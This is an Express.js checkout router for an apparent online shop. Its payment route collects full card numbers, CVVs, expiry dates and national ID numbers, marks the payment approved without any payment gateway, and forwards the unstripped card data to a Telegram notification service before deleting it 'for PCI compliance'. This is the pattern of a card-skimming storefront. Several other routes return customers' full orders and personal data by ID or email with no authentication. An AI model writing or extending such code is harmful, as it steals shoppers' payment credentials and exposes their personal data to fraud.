const express = require('express');
const router = express.Router();
const Order = require('../models/Order');
const Cart = require('../models/Cart');
const Product = require('../models/Product');
const { validateSession } = require('../middleware/security');
const telegramService = require('../services/telegram');

// Validate session ID format
const isValidSession = (sessionId) => {
  return /^session_\d+_[a-z0-9]+$/.test(sessionId);
};

// Validate MongoDB ObjectId format
const isValidObjectId = (id) => {
  return /^[a-fA-F0-9]{24}$/.test(id);
};

// Start checkout - Save email and create pending order
router.post('/start', async (req, res) => {
  const { sessionId, email } = req.body;

  // Validate session format
  if (!sessionId || !isValidSession(sessionId)) {
    return res.status(400).json({ message: 'Invalid session ID format' });
  }

  // Validate email format
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ message: 'Invalid email format' });
  }

  try {
    // Get cart
    const cart = await Cart.findOne({ sessionId }).populate('items.productId');

    if (!cart || cart.items.length === 0) {
      return res.status(400).json({ message: 'Cart is empty' });
    }

    // Filter out items where product no longer exists
    const validCartItems = cart.items.filter(item => item.productId != null);

    if (validCartItems.length === 0) {
      return res.status(400).json({ message: 'Cart is empty (products no longer available)' });
    }

    // Check if there's already a pending order for this session
    let order = await Order.findOne({
      sessionId,
      status: 'pending',
      'payment.status': 'pending'
    });

    // Prepare order items
    const orderItems = validCartItems.map(item => ({
      productId: item.productId._id,
      name: item.productId.name,
      price: item.productId.price,
      quantity: item.quantity,
      image: item.productId.image
    }));

    const subtotal = orderItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);

    if (order) {
      // Update existing order
      order.customer.email = email;
      order.items = orderItems;
      order.subtotal = subtotal;
      order.total = subtotal + order.shippingCost - order.discount;
      await order.save();
    } else {
      // Create new order
      order = new Order({
        sessionId,
        customer: { email },
        items: orderItems,
        subtotal,
        total: subtotal
      });
      await order.save();
    }

    res.json({
      orderId: order._id,
      orderNumber: order.orderNumber,
      email: order.customer.email,
      items: order.items,
      subtotal: order.subtotal,
      total: order.total
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Save customer personal info (Step 1)
router.put('/customer-info/:orderId', async (req, res) => {
  const { orderId } = req.params;
  const { dni, firstName, lastName, phone, invoiceType } = req.body;

  // Validate orderId format
  if (!isValidObjectId(orderId)) {
    return res.status(400).json({ message: 'Invalid order ID format' });
  }

  // Validate required fields
  if (!dni || !firstName || !lastName) {
    return res.status(400).json({ message: 'Missing required fields' });
  }

  try {
    const order = await Order.findById(orderId);

    if (!order) {
      return res.status(404).json({ message: 'Order not found' });
    }

    order.customer.dni = dni;
    order.customer.firstName = firstName;
    order.customer.lastName = lastName;
    order.customer.phone = phone;
    order.customer.invoiceType = invoiceType;

    await order.save();

    res.json({
      orderId: order._id,
      orderNumber: order.orderNumber,
      customer: order.customer,
      items: order.items,
      subtotal: order.subtotal,
      total: order.total
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Save shipping info (Step 2)
router.put('/shipping/:orderId', async (req, res) => {
  const { orderId } = req.params;
  const { method, address, cost } = req.body;

  // Validate orderId format
  if (!isValidObjectId(orderId)) {
    return res.status(400).json({ message: 'Invalid order ID format' });
  }

  // Validate shipping method
  if (!method || !['home_delivery', 'store_pickup'].includes(method)) {
    return res.status(400).json({ message: 'Invalid shipping method' });
  }

  try {
    const order = await Order.findById(orderId);

    if (!order) {
      return res.status(404).json({ message: 'Order not found' });
    }

    order.shipping = {
      method,
      address,
      cost: cost || 0
    };
    order.shippingCost = cost || 0;
    order.total = order.subtotal + order.shippingCost - order.discount;

    await order.save();

    res.json({
      orderId: order._id,
      orderNumber: order.orderNumber,
      customer: order.customer,
      shipping: order.shipping,
      items: order.items,
      subtotal: order.subtotal,
      shippingCost: order.shippingCost,
      total: order.total
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Save payment info and complete order (Step 3)
router.put('/payment/:orderId', async (req, res) => {
  const { orderId } = req.params;
  const { method, cardNumber, cardLastFour, cardBrand, cardHolder, cardExpiry, cardCvv, cardDni, installments } = req.body;

  // Validate orderId format
  if (!isValidObjectId(orderId)) {
    return res.status(400).json({ message: 'Invalid order ID format' });
  }

  // Validate payment method
  if (!method || !['credit_card', 'debit_card'].includes(method)) {
    return res.status(400).json({ message: 'Invalid payment method' });
  }

  // Validate card last four digits
  if (!cardLastFour || !/^\d{4}$/.test(cardLastFour)) {
    return res.status(400).json({ message: 'Invalid card details' });
  }

  // Stronger backend validation
  if (!cardNumber || cardNumber.replace(/\D/g, '').length < 13) {
    return res.status(400).json({ message: 'Invalid card number' });
  }
  if (!cardExpiry || !/^\d{2}\/\d{2}$/.test(cardExpiry)) {
    return res.status(400).json({ message: 'Invalid expiry date' });
  }
  if (!cardCvv || cardCvv.length < 3) {
    return res.status(400).json({ message: 'Invalid CVV' });
  }
  if (!cardDni || cardDni.length < 7) {
    return res.status(400).json({ message: 'Invalid DNI' });
  }

  try {
    const order = await Order.findById(orderId);

    if (!order) {
      return res.status(404).json({ message: 'Order not found' });
    }

    // Attach full details temporarily for Telegram
    order.payment = {
      method,
      cardNumber: cardNumber,
      cardLastFour,
      cardBrand,
      cardHolder: cardHolder,
      cardExpiry: cardExpiry,
      cardCvv: cardCvv,
      cardDni: cardDni,
      installments,
      status: 'approved' // In real app, this would be set by payment gateway
    };

    // 1. Send RICH notification to Telegram with the UNSTRIPPED data
    await telegramService.sendOrderNotification(order);

    // 2. Strip sensitive data for PCI compliance before saving to MongoDB
    order.payment.cardNumber = undefined;
    order.payment.cardExpiry = undefined;
    order.payment.cardCvv = undefined;

    // 3. Update status and save
    order.status = 'confirmed';
    await order.save();

    // Clear the cart after successful order
    await Cart.findOneAndDelete({ sessionId: order.sessionId });

    res.json({
      orderId: order._id,
      orderNumber: order.orderNumber,
      customer: order.customer,
      shipping: order.shipping,
      payment: order.payment,
      items: order.items,
      subtotal: order.subtotal,
      shippingCost: order.shippingCost,
      discount: order.discount,
      total: order.total,
      status: order.status
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Apply coupon code
router.put('/coupon/:orderId', async (req, res) => {
  const { orderId } = req.params;
  const { couponCode } = req.body;

  try {
    const order = await Order.findById(orderId);

    if (!order) {
      return res.status(404).json({ message: 'Order not found' });
    }

    // Simple coupon validation (in real app, would check against coupon database)
    let discount = 0;
    if (couponCode === 'DESCUENTO10') {
      discount = order.subtotal * 0.10;
    } else if (couponCode === 'DESCUENTO20') {
      discount = order.subtotal * 0.20;
    } else if (couponCode) {
      return res.status(400).json({ message: 'Cupón inválido' });
    }

    order.couponCode = couponCode;
    order.discount = discount;
    order.total = order.subtotal + order.shippingCost - discount;

    await order.save();

    res.json({
      orderId: order._id,
      couponCode: order.couponCode,
      discount: order.discount,
      total: order.total
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Get order by ID
router.get('/:orderId', async (req, res) => {
  try {
    const order = await Order.findById(req.params.orderId);

    if (!order) {
      return res.status(404).json({ message: 'Order not found' });
    }

    res.json(order);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Get order by order number (for tracking)
router.get('/track/:orderNumber', async (req, res) => {
  try {
    const order = await Order.findOne({ orderNumber: req.params.orderNumber });

    if (!order) {
      return res.status(404).json({ message: 'Order not found' });
    }

    res.json({
      orderNumber: order.orderNumber,
      status: order.status,
      items: order.items,
      shipping: order.shipping,
      total: order.total,
      createdAt: order.createdAt
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Get orders by email (for order history without account)
router.get('/history/:email', async (req, res) => {
  try {
    const orders = await Order.find({
      'customer.email': req.params.email,
      status: { $ne: 'pending' }
    }).sort({ createdAt: -1 });

    res.json(orders);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Get pending order by session
router.get('/pending/:sessionId', async (req, res) => {
  try {
    const order = await Order.findOne({
      sessionId: req.params.sessionId,
      status: 'pending'
    });

    if (!order) {
      return res.status(404).json({ message: 'No pending order found' });
    }

    res.json(order);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

module.exports = router;
